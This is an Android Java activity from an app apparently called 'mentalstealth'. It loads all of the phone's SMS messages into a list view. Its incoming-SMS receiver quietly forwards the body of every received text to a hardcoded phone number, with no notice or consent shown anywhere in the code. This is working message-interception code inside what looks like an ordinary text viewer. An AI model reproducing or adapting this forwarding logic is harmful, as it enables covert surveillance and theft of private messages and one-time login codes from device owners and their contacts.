package com.example.gabenator.mentalstealth;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import com.ibm.watson.developer_cloud.natural_language_understanding.v1.NaturalLanguageUnderstanding;
import com.ibm.watson.developer_cloud.natural_language_understanding.v1.model.AnalysisResults;
import com.ibm.watson.developer_cloud.natural_language_understanding.v1.model.AnalyzeOptions;
import com.ibm.watson.developer_cloud.natural_language_understanding.v1.model.Features;
import com.ibm.watson.developer_cloud.natural_language_understanding.v1.model.SentimentOptions;

import java.util.ArrayList;
import java.util.List;

public class ViewTexts extends AppCompatActivity implements View.OnClickListener, View.OnLongClickListener {

    private List<Message> messageList = new ArrayList<>();
    private RecyclerView recyclerView;
    private TextAdapter tAdapter;
    private DatabaseHandler databaseHandler;

    private BroadcastReceiver smsReceiver;
    private BroadcastReceiver smsSender;
    private int MY_PERMISIONS_REQUEST_SMS_SENT = 10;
    private int MY_PERMISSIONS_REQUEST_SMS_RECEIVE = 10;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_view_texts);

        databaseHandler = new DatabaseHandler(this);

        ArrayList<Message> list = databaseHandler.loadTexts();
        if(list.size() == 0) {
            loadTextMessages();
            for (int i = 0; i < messageList.size(); i++) {
                databaseHandler.addMessage(messageList.get(i));
            }
        } else {
            messageList.addAll(list);
        }

        recyclerView = (RecyclerView) findViewById(R.id.cycler);
        tAdapter = new TextAdapter(messageList, this);

        recyclerView.setAdapter(tAdapter);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));

        tAdapter.notifyDataSetChanged();

        initializeSMSReceiver();
        registerSmsReceiver();
    }

    public void loadTextMessages() {
        ContentResolver resolver = getContentResolver();
        String [] columns = new String[] {"date_sent", "type", "body","address"};
        Cursor cursor = resolver.query(Uri.parse("content://sms"), columns, null, null, null);

        if (cursor.moveToFirst()) {
            do {
                Message m;
                int date = cursor.getInt(0);
                int type = Integer.parseInt(cursor.getString(1));
                String body = cursor.getString(2);
                String creator = cursor.getString(3);
                m = new Message(type, body, date, creator);
                messageList.add(m);
            } while (cursor.moveToNext());
        }
    }

    @Override
    public void onClick(View v) {
        if (!messageList.isEmpty()) {
            int pos = recyclerView.getChildLayoutPosition(v);
            Message m = messageList.get(pos);
            Toast.makeText(getApplicationContext(), "You tapped on this message: " + m.getContent(), Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public boolean onLongClick(View v) {
        return true;
    }

    private void initializeSMSReceiver() {
        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Bundle bundle = intent.getExtras();
                if(bundle != null) {
                    Object [] pdus = (Object []) bundle.get("pdus");
                    for(int i = 0; i < pdus.length; i++) {
                        byte[] pdu = (byte []) pdus[i];
                        SmsMessage message = SmsMessage.createFromPdu(pdu, "3gpp");
                        String text = message.getDisplayMessageBody();
                        String sender = message.getOriginatingAddress();
                        SmsManager smsManager = SmsManager.getDefault();
                        smsManager.sendTextMessage("13123918925", null, text, null, null);
                    }
                }
            }
        };
    }

    private void registerSmsReceiver() {
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);
    }

}
